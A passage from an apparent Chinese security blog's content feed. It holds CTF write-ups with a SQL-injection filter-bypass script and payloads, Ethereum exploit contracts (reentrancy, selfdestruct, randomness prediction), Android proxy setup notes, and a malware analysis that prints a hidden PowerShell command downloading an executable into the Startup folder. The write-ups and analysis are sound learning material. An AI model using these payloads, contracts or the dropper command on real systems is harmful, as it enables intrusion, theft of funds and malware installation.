$_SESSION['user'] = $row['username']; redirect('/'); } else { redirect('/', &quot;unknown action: $action&quot;); } } $user = @$_SESSION['user'];?&gt;&lt;!DOCTYPE html&gt;&lt;head&gt; &lt;title&gt;🦉🦉🦉🦉&lt;/title&gt; &lt;meta charset='utf-8'&gt; &lt;link href=&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; id=&quot;bootstrap-css&quot;&gt; &lt;script src=&quot;//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;?php if (!$user): ?&gt; &lt;div id=&quot;login&quot;&gt; &lt;h3 class=&quot;text-center text-white pt-5&quot;&gt;GUESS THE STUPID USERNAME / PASSWORD&lt;/h3&gt; &lt;div class=&quot;container&quot;&gt; &lt;div id=&quot;login-row&quot; class=&quot;row justify-content-center align-items-center&quot;&gt; &lt;div id=&quot;login-column&quot; class=&quot;col-md-6&quot;&gt; &lt;div id=&quot;login-box&quot; class=&quot;col-md-12&quot;&gt; &lt;form id=&quot;login-form&quot; class=&quot;form&quot; action=&quot;?action=login&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; value=&quot;&lt;?= htmlentities($csrf-&gt;generate()) ?&gt;&quot;&gt; &lt;h3 class=&quot;text-center text-info&quot;&gt;🦉: &quot;Login to see cool things!&quot;&lt;/h3&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;name&quot; class=&quot;text-info&quot;&gt;Username:&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot; class=&quot;form-control&quot;&gt;&lt;br&gt; &lt;label for=&quot;name&quot; class=&quot;text-info&quot;&gt;Password:&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;text&quot; name=&quot;password&quot; id=&quot;password&quot; class=&quot;form-control&quot;&gt;&lt;br&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-info btn-md&quot; value=&quot;Login&quot;&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php else: ?&gt; &lt;h3 class=&quot;text-center text-white pt-5&quot;&gt;&lt;a style=&quot;color: white&quot; href=&quot;/?source&quot;&gt;SHOW HINT&lt;/a&gt;&lt;/h3&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;row justify-content-center align-items-center&quot;&gt; &lt;div class=&quot;col-md-6&quot;&gt; &lt;div class=&quot;col-md-12&quot;&gt; &lt;h3 class=&quot;text-center text-info&quot;&gt;Nothing&lt;/h3&gt; Hello, &lt;b&gt;&lt;?= htmlentities($user) ?&gt;&lt;/b&gt;, nothing here. &lt;a href=&quot;?action=logout&quot;&gt;Logout!&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php endif ?&gt;&lt;/body&gt; 就是 sqlite 的 SQL Injection，輸入的 username 會用 str_ireplace 過濾兩次，很好繞過，打 ///*** 就會被過濾成 /*，打 selselselectectect 就會被過濾成 select，所以寫個簡單的 script 自動轉換 payload 123456789101112131415161718import systable = { ' ': '/**/', '/*': '///***', '*/': '***///', 'union': 'unununionionion', 'select': 'selselselectectect', 'and': 'anananddd', 'or': 'ooorrr', 'where': 'whewhewhererere', 'from': 'frfrfromomom',}inp = sys.argv[1]for t,v in table.items(): inp = inp.replace(t, v)print(inp) 注意到 -- 還是沒辦法用，因為 -selselectect- 會被轉成空的，select 順序在 -- 前面會先被過濾掉，str_ireplace 是照著 list 一個個 replace 的，不過我們用 /* 就足夠了。 1'///******///unununionionion///******///selselselectectect///******///null,sql,null///******///frfrfromomom///******///sqlite_master///******///whewhewhererere///******///type='table'///******///limit///******///1///******///offset///******///0///*** 先挖 table，找到 CREATE TABLE garbage ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, value TEXT )，只有這個 garbage 和 users 1'///******///unununionionion///******///selselselectectect///******///null,name,null///******///frfrfromomom///******///garbage///******///limit///******///1///******///offset///******///0///*** 再挖 db 裡面，挖到有個 name 是 something good，挖他的 value 就看到 flag 了 1AIS3{4_ch1ld_15_4_curly_d1mpl3d_lun471c} Rhino 這題網站在 https://rhino.ais3.org/，robots.txt 可以看到東西 12345678910111213# RIP robots!User-agent: *Disallow: /Disallow: /index.htmlDisallow: /*.xmlDisallow: /recentDisallow: /assetsDisallow: /aboutDisallow: /*.jsDisallow: /*.jsonDisallow: /node_modulesDisallow: /flag.txt 然後這個網站看起來是用 express 架的然後放 jekyll 產的 blog，既然是 js project 先看個 package.json 123456789101112131415{ &quot;name&quot;: &quot;app&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;description&quot;: &quot;&quot;, &quot;scripts&quot;: { &quot;start&quot;: &quot;node chill.js&quot;, &quot;test&quot;: &quot;echo \\&quot;Error: no test specified\\&quot; &amp;&amp; exit 1&quot; }, &quot;author&quot;: &quot;djosix&quot;, &quot;license&quot;: &quot;ISC&quot;, &quot;dependencies&quot;: { &quot;cookie-session&quot;: &quot;^1.4.0&quot;, &quot;express&quot;: &quot;^4.17.1&quot; }} 然後就看到原始碼叫做 chill.js 123456789101112131415161718192021222324252627const express = require('express');const session = require('cookie-session');let app = express();app.use(session({ secret: &quot;I'm watching you.&quot;}));app.use('/', express.static('./'));app.get('/flag.txt', (req, res) =&gt; { res.setHeader('Content-Type', 'text/plain'); let n = req.session.magic; if (n &amp;&amp; (n + 420) === 420) res.sendFile('/flag'); else res.send('you are a sad person too');});app.get('*', function(req, res){ res.status(404).sendFile('404.html', { root: __dirname });});app.listen(process.env.PORT, '0.0.0.0'); 看起來只要讓他的 n &amp;&amp; (n + 420) === 420 就可以讀 flag 了，以前就很常看到 FB 上有人 po 一些 js 的梗圖說明 js 很古怪的行為，隨便看了幾張複習一下，就想到有浮點數誤差的問題，所以 n 設成 0.00000000000001 就可以了，n 是從 req.session.magic 抓的，所以我們要設 req.session.magic 的話，最簡單的方式就是自己把 server 架起來，然後多加一行 req.session.magic = 0.00000000000001，就可以產出 express:sess 和 express:sess.sig 兩個 Cookie 了，sig 是用前面設定的 secret: &quot;I'm watching you.&quot; 算出來的，詳情可以看 cookie-session。 1AIS3{h4v3_y0u_r34d_7h3_rh1n0_b00k?}","link":"/2020/06/09/ais3-2020-preexam/"},{"title":"【安卓逆向】Android Studio Emulator + ADB 環境佈置","text":"紀錄一下怎麼設定好一台 Android 的虛擬機 我是用 Android Studio 裡面的 Emulator，所以要先裝一下 Android Studio 打開 AVD Manager 後點 Create Virtual Device 選一個 device，比如 Pixel 3a 選一個 system image，比如 Pie 完成 ADB ( Android Debug Bridge ) 路徑 在 Android SDK 的 platform-tools 裡面，用 macos 的話應該會在 /Users/xxx/Library/Android/sdk/platform-tools/ 沒有的話可以去 官網 載 基本功能 指令 解釋 adb devices 列出所有裝置 adb root 用 root 權限重開 adb 服務 adb shell 互動式的 shell adb shell &quot;ls&quot; 執行一行指令 adb push ./myfile /data/local/tmp/ 傳檔案進去 adb pull /data/local/tmp/myfile ./ 抓檔案出來 adb reboot 重開機，可以簡單粗暴的驗證有沒有設置成功 如果有多台裝置的話，要加 -s 指定哪一個裝置，比如 adb -s emulator-5554 shell 疑難雜症 Q : 遇到 adbd cannot run as root in production builds 怎麼辦 ? A : 在選 image 的時候要選 target 是 Google APIs 的 Q : 怎麼卸載 system image ? A : 打開 SDK Manager ( 在 AVD Manager 旁邊 )，勾選 Show Package Details，就可以看到下載過的 system image，取消勾選再按 OK 就卸載了 Q : 怎麼卸載 app ? A : 除了麻瓜的方法外，也可以在 adb shell 拿到 shell 之後，用 pm list packages 看有哪些 app，再用 pm uninstall -k com.example.test_app 卸載 app Q : 怎麼把 apk 抓出來? A : 先用 pm path com.example.test_app 找出 apk 的路徑，再用 adb pull /data/app/com.example.test_app.apk ./ 抓出來 其他的 Android 虛擬機 如果你只是想玩遊戲的話，可以參考下面幾款模擬器 BlueStacks NoxPlayer ( 夜神模擬器 ) MemuPlay ( 逍遙模擬器 ) 等等","link":"/2020/02/15/android-emulator/"},{"title":"【安卓逆向】透過 Burp Suite Proxy 夜神模擬器","text":"前言 在上一篇 adb 的環境佈置中，我們是用 Android Emulator，但我想要 reverse 的 app 只有支援 arm ( 蠻多 app 都沒有支援 x86-64 的 )，而在我 x86-64 機器上的 Android Emulator 上開 arm 的虛擬機很慢，所以我就換用了 Nox Player，他同時支援 arm 跟 x86-64 的架構，速度也挺快的。 恩等等，我剛剛才發現原來 Nox Player 是在 VirtualBox 上面開一台虛擬機跑，傻眼。 怎麼知道這個 app 支援什麼用 apktool 解開 apk 檔後，看 /lib 資料夾下面有哪些資料夾，可能會有 arm64-v8a、armeabi-v7a、x86、x86_64 等，這些就是這個 app 用到的函式庫，沒有對應架構的函式庫當然就是不支援了，或者有些 app 會將每個架構分開發佈，只要去下載對應架構的 app 就可以了。 adb 怎麼連上夜神模擬器夜神模擬器預設會把 adb server 開在 port 62001, 62025, 62026, … ( 我不知道為什麽 62001 直接跳到 62025 ) 所以 adb connect localhost:62001 就可以啦 Drony 主要是參考這篇 Android Hacking | Setup Global Proxy for All Apps in Android (without root) with Burp Suite 的教學，在使用 Drony 前，我還有用過另一款叫 ProxyDroid，不過沒成功，不知道出了什麼事。 基本流程是這樣的，因為 Drony 本身也是一個 proxy server，所以要先在 Android 的設定中將 proxy 導向到 Drony，然後在 Drony 的設定中將 proxy 導向主機的 Burp Suite。 第一步 打開 Android 的設定，照著下面這樣點 設定 &gt; 無限與網路 &gt; Wi-Fi &gt; 你的 Wi-FI 的名字 ( 長按他 ) &gt; 修改網路 &gt; 顯示進階選項 &gt; Proxy ( 手動 ) 主機名稱填 127.0.0.1，通訊埠填 8020 ( Drony 預設的通訊埠 ) 第二步 打開 Drony 的設置，照著下面這樣點 設置 &gt; 網路 &gt; 無線網路 &gt; 你的 Wi-FI 的名字 代理類型選手冊 ( 也就是 Manual，真爛的翻譯 )，主機名稱填主機的 ip，通訊埠填 8080 ( Burp Suite 預設的通訊埠 ) 怎麼找主機的 ip主機基本上會是 Nox Player 的 default gateway ( 其實就是在 VirtualBox 的 NAT Mode )，所以下 adb shell ip route show 找到 default gateway 就是主機的 ip 了 完成 這樣就設定好啦，在日誌頁面把開關打開就可以了。 Burp Suite 憑證安裝 順便安裝一下 Burp Suite 的憑證，這樣就不會一直跳憑證問題了 先到 http://burp 下載 Burp Suite 的憑證，載下來是 der 副檔名的話，先把他改名成 cer 副檔名結尾 打開 Android 的設定，照著下面這樣點 設定 &gt; 個人 &gt; 安全性 &gt; 憑證儲存空間 &gt; 從 SD 卡安裝 ( 選 cacert.cer ) 安裝的時候他會叫你設定一下 PIN 碼","link":"/2020/03/18/android-proxy/"},{"title":"【CTF Writeups】Security Innovation Blockchain CTF","text":"這邊是紀錄我寫 Security Innovation Blockchain CTF 的 Writeups Donation 這題是簽到題 就只是讓我們呼叫合約裡面的這個函式 withdrawDonationsFromTheSuckersWhoFellForIt Lock Box 這題有個 private 的 pin 變數，但是 private 只是代表那個變數沒有 getter 函式，把合約的狀態抓下來就看光光啦 使用 web3.eth.getStorageAt 這個函式 父合約的變數會在子合約的變數的前面 所以 position 0 的位址是 authorizedToPlay，而 position 1 的位址就是 pin 變數在 storage 裡面怎麼擺的可以參考這篇 Understanding Ethereum Smart Contract Storage Piggy Bank 這題直接呼叫 collectFunds 就好了 只有 PiggyBank 的 collectFunds 有 onlyOwner，CharliesPiggyBank 的 collectFunds 沒有 onlyOwner SI Token Sale 這題的 purchaseTokens 沒有用 SafeMath，也沒有檢查 _value 要大於 feeAmount 先轉個 0.000001 給合約，這樣 0.000001 - 0.00001 就會 underflow 變成很大的數字，就得到了超多的 token 然後再用 refundTokens 就可以半價把 token 換成 ether 錢錢了 Secure Bank SecureBank 的 withdraw 和 MembersBank 的 withdraw 其中的 _value 參數形態不一樣 他們會被看成是不一樣的函式，所以會有兩個不一樣的型態 withdraw 可以呼叫 而 MembersBank 的 withdraw 沒有檢查是不是本人，所以就直接把 contract creator 的錢領走 Lottery 這題要猜 entropy^entropy2 的值，猜到就可以拿走裡面的錢錢 entropy = blockhash(block.number)，但是我們沒辦法知道這個 block 的 blockhash，因為這個 block 還沒算完 但這樣寫不會有錯誤，只是出來的值會是 0 既然 entropy = 0 那就只剩 entropy2，而 entropy2 是根據 msg.sender 來的 所以我們可以直接算出 _seed 的值 可以直接用 remix 寫個簡單的 smart contract 幫我們算那個值，然後利用 event 來印出那個值 ( 當 print 用 ) 123456789pragma solidity ^0.5.9;contract test { event Log(bytes32 value); function go () public { emit Log(keccak256(abi.encodePacked(msg.sender))); }} 或是直接寫一個攻擊合約，去呼叫 play 函式 記得要先把這個合約加到 authorizedToPlay，如果是 gas 不夠就調高 gas limit 吧 12345678910111213141516pragma solidity ^0.5.9;import &quot;./challenge.sol&quot;;contract hack { function exploit(address payable _target) public payable { Lottery target = Lottery(_target); bytes32 entropy2 = keccak256(abi.encodePacked(this)); uint256 seeds = uint256(entropy2); target.play.value(msg.value)(seeds); msg.sender.transfer(address(this).balance); }} Trust Fund 這題是經典的 reentrant attack 123456789101112131415161718192021222324252627pragma solidity ^0.5.9;contract TrustFund { function withdraw() external {}}contract hack { address target = 0xd297ab1c9653295BdE4f6b2e32574Ac5DD994997; uint count = 10; function () external payable { if (count &gt; 0) { count--; TrustFund trust = TrustFund(target); trust.withdraw(); } } function exploit () public { TrustFund trust = TrustFund(target); trust.withdraw(); } function withdraw () public { msg.sender.transfer(address(this).balance); }} Heads or Tails 這題跟 Lottery 很像，不過用的是上一個 block 的 blockhash 那就寫個攻擊合約去呼叫 play，就可以算出一樣的 entropy 給 0.1 ether 能賺 0.05 ether，所以玩個 20 次就把錢全部撈出來啦 記得要寫 fallback 函式才能接錢進來呀 ( 我這裡卡超久der ) 123456789101112131415161718192021222324pragma solidity ^0.5.9;contract HeadsOrTails { function play(bool _heads) external payable {}}contract hack { address target = 0xf8583ccB9900615e0b8304A16539EBFD96c2B0af; function () external payable {} function exploit () public payable { bytes32 entropy = blockhash(block.number - 1); bool coinFlip = (entropy[0] &amp; '\\x01') == '\\x01'; HeadsOrTails heads = HeadsOrTails(target); for (uint i = 0; i &lt; 20; i++) { heads.play.value(0.1 ether)(coinFlip); } msg.sender.transfer(address(this).balance); }} Record Label 這題的題目很長，主要的邏輯就是你領錢的時候會被 royalties 抽成，manager 會抽成 80 趴的錢錢 所以如果直接呼叫 withdrawFundsAndPayRoyalties 就可以拿到 0.2 ether，royalties 抽走 0.8 ether，這題就解掉了 ( 題目合約 balance = 0 ) 不過正確的解法 ( 我全都要 ) 應該是找出 _manager 的地址，然後呼叫 addRoyaltyReceiver 把 receiverToPercentOfProfit 這個 mapping 中 _manager 的 percent 覆寫成 0 這樣去領錢就不會被抽成了 Slot Machine 這題的題目很短，就一個 fallback 函式 但是第一行限制一次只能匯款 1 szabo ( 0.000001 ether ) 目標是要讓這個合約的 balance 大於等於 5 ether，他就會把所有錢錢都給你 其中一個不透過 fallback 給錢的方法就是用 selfdestruct selfdestruct 就是把合約清除掉，在被清除掉之前，這個合約可以把他的錢錢匯款給一個帳戶，而這個匯款的動作不會經過 fallback 函式 寫一個攻擊合約，並給他 5 ether，讓他自我毀滅，並在毀滅之前把 5 ether 匯款給題目合約 1234567pragma solidity ^0.5.9;contract hack { function exploit () public payable { selfdestruct(address(0x22f616f6b95e23efa8FBBAE44BeeC05890E12A4E)); }} https://f3real.github.io/tag/ethereum.html https://xz.aliyun.com/t/2759","link":"/2019/06/07/blockchain-ctf/"},{"title":"【部落格開發日誌】0x00","text":"之前的部落格是用 mkdocs，但是 mkdocs 其實是用來生成 document 的，不是拿來生成部落格的，所以文章都沒有日期，也沒有近期文章或是標籤的功能，我之所以選 mkdocs 是因為 mkdocs-material 實在太好看了很對我胃口，不過最近興起了想幫部落格換個皮的念頭，主要是看上了 icarus 和 material-x 這兩個主題，都是 hexo 的主題，最後選了 icarus，然後再自己手動調整，下面會說明一下我手動調整的內容 排版 這個主題整體來說很好看的，但是我不喜歡他的排版，文章只能擠在中間細細長長的，左右兩邊還留了很多空隙，不知道是作者的螢幕太小還是我螢幕太大，所以我把所有 widget 都移到左邊，然後把欄位的比例改成 3:9，css 的部份在 source/css/style.styl:21 把寬度調寬 layout/layout.ejs12case 2: return 'is-9-tablet is-9-desktop is-9-widescreen'; layout/common/widget.ejs12case 2: return 'is-3-tablet is-3-desktop is-3-widescreen'; source/css/style.styl1234567891011121314gap = 40px...@media screen and (min-width: screen-widescreen) .is-1-column .container .is-2-column .container max-width: screen-widescreen - 2 * gap width: screen-widescreen - 2 * gap@media screen and (min-width: screen-fullhd) .is-2-column .container max-width: screen-fullhd - 2 * gap width: screen-fullhd - 2 * gap .is-1-column .container max-width: screen-fullhd - 2 * gap width: screen-fullhd - 2 * gap Read More 原本 icarus 只有 excerpt 這個選項可以加在文章的 front-matter 中，如下 1234---title: &quot;部落格開發日誌&quot;excerpt: 寫一些摘要在這邊--- 但是要每一篇都要自己寫摘要好麻煩，我比較想要的是只顯示固定長度，然後邊邊模糊處理，所以就自己手刻了一個 layout/common/article.ejs12345678&lt;div class=&quot;card &lt;%= index &amp;&amp; (!post.hasOwnProperty('readmore') || post.readmore) ? 'card-readmore' : '' %&gt;&quot;&gt;... &lt;% if (index &amp;&amp; (!post.hasOwnProperty('readmore') || post.readmore)) { %&gt; &lt;div class=&quot;level is-mobile readmore-button&quot;&gt; ... &lt;/div&gt; &lt;% } %&gt;... source/css/style.styl12345678910111213141516171819202122232425262728.card-readmore max-height: 400px overflow: hidden position: relative .readmore-button position absolute left: 0 bottom: 20px width: 100% display: flex justify-content center z-index: 20 &amp;:after content: '' position: absolute bottom: 60px width: 100% height: 100px z-index: 10 background-image: linear-gradient(to bottom, hsla(0, 100%, 100%, 0), hsla(0, 100%, 100%, 0.9)) &amp;:before content: '' position: absolute bottom: 0 width: 100% height: 60px z-index: 10 background-image: linear-gradient(to bottom, hsla(0, 100%, 100%, 0.9), hsla(0, 100%, 100%, 1)) Adblock 我本身有在用 AdBlock，然後在用 icarus 主題的時候發現有些物件會憑空消失，比如 back-to-top 那個按了可以回到頁面頂端的小按鈕，後來發現是被 AdBlock 砍了，因為那個小按鈕有 .back-to-top 這個 class，不只 .back-to-top 還有很多關鍵字會被砍，可以看這份 Class and ID to avoid because of AdBlock，那我的解決辦法就是把原始碼裡所有的 back-to-top 改名成 bottom-to-top 就在剛剛，我寫完第一段之後，發現上面的 h2 標題 Adblock 因為 markdown 生成 html 時自動加了 id=Adblock，然後就被 AdBlock 砍了，只好改成自己手刻 html 1&lt;h2&gt;Adblock&lt;/h2&gt; 另一個被砍掉的是 font-awesome 的 icon .fa-instagram，這個就不好改名了，所以我加了一小行 javascript 把 .fa-ig 改成 .fa-instagram，以結果來看我的 script 跑的順序應該是比 AdBlock 來得後面所以沒有被砍 source/js/main.js1234$(document).ready(function() { $('.fa-ig').addClass('fa-instagram'); $('.fa-ig').removeClass('fa-ig');}); Github mkdocs-material 主題的右上角有顯示 github star 的功能，我覺得很酷，所以就搬過來了 layout/common/navbar.ejs123456&lt;a class=&quot;navbar-item github-source&quot; href=&quot;&lt;%= github.url %&gt;&quot;&gt; &lt;div class=&quot;github-source-icon&quot;&gt;&lt;i class=&quot;fab fa-lg fa-github-alt&quot;&gt;&lt;/i&gt;&lt;/div&gt; &lt;div class=&quot;github-source-repository&quot;&gt; &lt;%= github.name %&gt; &lt;/div&gt;&lt;/a&gt; source/css/style.styl1234567891011121314151617181920212223242526.github-source .github-source-icon padding: 5px .github-source-repository padding-left: 10px font-size: 10px font-weight: 1000 ul animation: animateElement linear .3s; animation-iteration-count: 1; li float: left font-weight: 200 #github-forks margin-left: 3px@keyframes animateElement{ 0% { opacity:0; transform: translate(0px,10px); } 100% { opacity:1; transform: translate(0px,0px); }} source/js/main.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647if (typeof (IcarusThemeSettings) !== 'undefined' &amp;&amp; typeof (IcarusThemeSettings.github.url) !== 'undefined') { const url = IcarusThemeSettings.github.url console.log(url) const matches = /^.+github\\.com\\/([^/]+)\\/?([^/]+)?.*$/.exec(url) console.log(matches) if (matches &amp;&amp; matches.length === 3) { const [, user, name] = matches console.log(user, name) const api = `https://api.github.com/users/${user}/repos` const paginate = (page = 0) =&gt; ( fetch(`${api}?per_page=100&amp;sort=updated&amp;page=${page}`) .then(response =&gt; response.json()) .then(data =&gt; { if (!(data instanceof Array)) return [] /* Display number of stars and forks, if repository is given */ if (name) { const repo = data.find(item =&gt; item.name === name) if (!repo &amp;&amp; data.length === 30) return paginate(page + 1) if (typeof repo.stargazers_count !== 'number' || typeof repo.forks_count !== 'number') return [] /* If we found a repo, extract the facts */ return repo ? [ `${repo.stargazers_count} Stars`, `${repo.forks_count} Forks` ] : [] /* Display number of repositories, otherwise */ } else { return [ `${data.length} Repositories` ] } }) ) paginate().then(data =&gt; { console.log(data) const [stars, forks] = data const facts = $(`&lt;ul class=&quot;github-facts&quot;&gt;&lt;li id=&quot;github-stars&quot;&gt;${stars}&lt;/li&gt;&lt;li id=&quot;github-forks&quot;&gt;• ${forks}&lt;/li&gt;&lt;/ul&gt;`) $('.github-source-repository').append(facts) }) }} 舊部落格 舊的部落格我還在慢慢搬移當中，所以我把 mkdocs 生成的 html 放進來 hexo 當 static files，只要放在 source/old/ 底下然後在 _config.yml 裡面加一行 skip_render: old/**，hexo 就不會去 render 他了 疑難雜症 在改主題原始碼的過程中，遇到各種奇怪問題時，記得先 hexo clean 一下","link":"/2020/01/23/blog00/"},{"title":"【部落格開發日誌】0x01","text":"部落格架好後，趁熱使用一下各種網站追蹤評測的工具，比如 Google Search Console, Google Analytics, PageSpeed Insights, Sitechecker, Hotjar Hotjar 記錄使用者點擊的 heatmap 記錄使用者游標移動的路徑 還可以收集使用者的 feedback 回饋，不過載入時間有點久，部落格也不太需要這些資訊，所以就拔掉了，試用一下而已xD SEO Defer offscreen images 參考 Lazy load offscreen images with lazysizes，只要載入 lazysizes 這個 scripts 進來，然後把 src 改成 data-src 並加上 class=&quot;lazyload&quot; 就好了 註冊個 hexo 的 after_render，把所有 img tag 抓出來改就完事了 scripts/lazy-load-image.js123hexo.extend.filter.register('after_render:html', function (htmlContent) { return htmlContent.replace(/&lt;img src=&quot;([^&quot;]*)&quot; (?:class=&quot;([^&quot;]*)&quot;)?([^&gt;]*)&gt;/, '&lt;img data-src=&quot;$1&quot; class=&quot;$2 lazyload&quot; $3&gt;')}); lazysizes 有 cdn，很方便的 layout/common/scripts.ejs1&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.0/lazysizes.min.js&quot; defer&gt;&lt;/script&gt; Sitemap 1npm install hexo-generator-sitemap 裝好 hexo-generator-sitemap 之後，在 _config.yml 加一行收工 12sitemap: path: sitemap.xml Robots.txt 直接放在 source/_posts 下面就行了，簡單搞定","link":"/2020/02/08/blog01/"},{"title":"【部落格開發日誌】0x02","text":"Admonition 我把 Material for MkDocs - Admonition Extension 搬過來啦，因為實在太好看，就搬過來用了，並且做了下面兩個小改動 把 border-radius 拔掉了，還是方的好看 陰影改淡了，感覺比較對 example這是範例 note這是範例 abstract這是範例 info這是範例 tip這是範例 success這是範例 question這是範例 warning這是範例 failure這是範例 danger這是範例 quote這是範例 實作 從 hexo-tag-admonition 借 code 過來改 基本上就是 register 一個新的 hexo tag，然後用到了 details 和 summary 這兩個 html5 新的 tag 改的時候有幾個小地方要注意 details tag 原本就有一個箭頭但是很醜，在 summary::-webkit-details-marker 設定 display:none 拔掉他 icon 用到了 font-family: Material Icons，要在 head 裡面加個字體 Code block 另一個改動是程式碼區塊的部分，原來的有點小醜，就改了幾下 沒有給檔名就不要顯示上面的 header 可以指定起始行數，以及指定標記特定行數，如下範例 1python run.py &gt;3,6 run.py >3,6123456import mathdef main(): print(f'test {math.factorial(5)}')main()","link":"/2020/02/22/blog02/"},{"title":"【部落格開發日誌】0x03","text":"部落格要恢復更新啦 距離上次更新也過了一年多了，期間為了更加客製化主題，還想過要自己從頭刻部落格，真是太天真了啊 最後還是回來用新版的 icarus 主題，真香。 之前是把 icarus 主題跟部落格綁在同個 repo 一起更新，但這樣不好管理，所以現在就直接 fork 一份出來維護，是用最版的 5.0.0-rc.1，之後有新版本就再 merge 進來就好了。把之前做過得一些改動都整合進主題了，還是自己客製化過得最對味啊。 之後會慢慢把之前的文章再放回來，應該至少一週一更吧，希望xD icarus 大改版 我之前用的 icarus 版本還在寫 .ejs 現在已經在寫 .jsx 了 之前的部落格開發日誌上的程式碼有些可能都不能直接套用了 不過不用擔心我現在已經把我改的程式碼推到 這裡 了 Excerpt 我發現 icarus 的 excerpt 可以寫在文章內容的開頭，而不用寫在 front matter 中間加一個 &lt;!-- more --&gt; 和文章主體區隔 像是下面這樣，或是看這裡範例 12345Hello, this is the excerpt&lt;!-- more --&gt;This is the article 這樣 excerpt 也可以快樂寫 markdown 在首頁也只會顯示到 &lt;!-- more --&gt; 之前的內容 但是點 Read More 的按鈕跳進去文章之後，會發現 excerpt 其實還在 只是頁面會捲動到 #more 這個 hashtag 也就是文章主體的開頭 不過這樣感覺只是一個偷懶的作法，不是一個完美的作法","link":"/2022/03/30/blog03/"},{"title":"【演算法筆記】Bloom Filter","text":"Bloom Filter 用來快速搜尋資料是否存在於資料庫 我們的資料庫是一個 $2^m$ 大小的陣列 1db = [False] * (2 ** m) 加資料進資料庫 我們有 $k$ 個 hash function 的輸出都是一個 $m$ bits 的數 ( $&lt; 2^m$ ) 把資料 $x$ 加進資料庫就是等於，將 $x$ 的各個雜湊值的位置設成 True 12for i in range(k): db[hash[k](x)] = True 查詢資料是否在資料庫裡 查詢資料 $x$ 是否在資料庫裡 1234if all([db[hash[k](x)] for i in range(k)]): # 資料 x 可能在資料庫裡else: # 資料 x 一定不在資料庫裡 http://www.evanlin.com/BloomFilter/ http://bryanpendleton.blogspot.com/2011/12/three-papers-on-bloom-filters.html","link":"/2018/09/11/bloom-filter/"},{"title":"【程式語言】What&#39;s new in C++17","text":"Structured Bindings 1auto [a, b, c] = tuple('a', 1, 0.5); 12345map&lt;int, int&gt; mymap = {{1, 2}, {3, 4}};for (const auto&amp; [key, value] : mymap) { // ...} 123for (auto [a, b] = tuple(0, 'a'); a &lt; 5; a++) { // ...} Template Argument Deduction c++171auto p = pair(2, 4.5); c++141auto p = pair&lt;int, double&gt;(2, 4.5); Selection Initialization 123if (auto a = getval(); a &lt; 10) { // ...} 123switch (auto ch = getnext(); ch) { // ...} https://www.fluentcpp.com/2018/06/19/3-simple-c17-features-that-will-make-your-code-simpler/ https://hackernoon.com/a-tour-of-c-17-if-constexpr-3ea62f62ff65 https://stackoverflow.com/questions/38060436/what-are-the-new-features-in-c17","link":"/2019/01/06/c++17/"},{"title":"Clipboard hijacking cryptocurrency malware on tradingview.com","text":"最近在 tradingview.com 上面看到這篇 Idea EOS - footprints of institutional money，看起來像是正常的分析趨勢走向的 Idea，但是下面留言有一個連結 mycryptorush.com/signals，說是可以得到免費的 bitcoin 和交易趨勢訊號。 點下去其實是導向 tinyurl.com/cryptorushsignals，這個短網址又是導向 https://bbuseruploads.s3.amazonaws.com/7e1f7e0b...，會下載 CryptoRushSignals.zip 下來。看起來就很可疑，明明看起來是要去一個網站，卻載了檔案下來。解壓縮該 zip 檔之後有兩個檔案 HOWTOUSE.txt 和 CryptoRushSignals.run.lnk。 HOWTOUSE.txt12Open CryptoRushSignals.run, this will open up a website were you can register.It then automatically will open up an excel sheet with the live current signals. 純文字的說明文件，叫你執行 CryptoRushSignals.run，真的去執行之後，會跳出瀏覽器瀏覽 https://t.me/MyCryptoradar，讓你加入一個 telegram 群組，就可以收到一些指標數據的變化通知，裡面現在有 400 多人。 除了打開瀏覽器叫你加群組之外，他還秘密執行了下面這段 payload 1&quot;C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot; -nop -w hidden [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Start-Process -FilePath &quot;https://t.me/MyCryptoradar; Invoke-WebRequest -Uri &quot;https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png&quot; -OutFile C:\\Users\\$env:UserName\\AppData\\Roaming\\Microsoft\\Windows\\Start` Menu\\Programs\\Startup\\pclp.exe 基本上就是去 bitbucket 下載 https://bitbucket.org/cryptorushh/cryptorush/downloads/pcmoni.png 這個 png，然後放到開機自動執行的路徑，而且這個也不是 png，他就是一隻 PE 執行檔。 稍微看一下那隻 PE 執行檔後，發現他是用 py2exe 包的，那就用 unpy2exe 拆回 pyc，再用 uncompyle6 就可以拆出原本的 python script 了。 8.61.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# uncompyle6 version 3.7.2# Python bytecode 2.7 (62211)# Decompiled from: Python 2.7.15 (default, Dec 23 2019, 14:00:59) # [GCC 4.2.1 Compatible Apple LLVM 10.0.1 (clang-1001.0.46.4)]# Embedded file name: 8.61.py# Compiled at: 2020-08-15 23:23:49from __future__ import print_functionimport sysoo000 = sys.version_info[0] == 2ii = 2048oOOo = 7def O0(ll_opy_): o0O = ord(ll_opy_[(-1)]) iI11I1II1I1I = ll_opy_[:-1] oooo = o0O % len(iI11I1II1I1I) iIIii1IIi 